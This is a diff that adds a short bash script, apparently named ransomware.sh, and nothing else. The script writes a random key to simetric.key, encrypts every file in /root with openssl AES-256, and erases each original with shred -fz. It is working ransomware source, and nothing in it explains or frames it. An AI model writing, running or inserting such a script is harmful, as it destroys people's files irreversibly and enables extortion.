@@ -1,0 +1,10 @@
+#!/bin/bash
+echo $(/usr/bin/dbus-uuidgen) > simetric.key
+for file in /root/*
+do
+if [ "$file" != "ransomware.sh" ] && [ "$file" != "simetric.key" ];
+then
+openssl enc -aes256 -k $(<simetric.key) -a -e -in $file -out $file".enc"
+shred -fz $file
+fi
+done
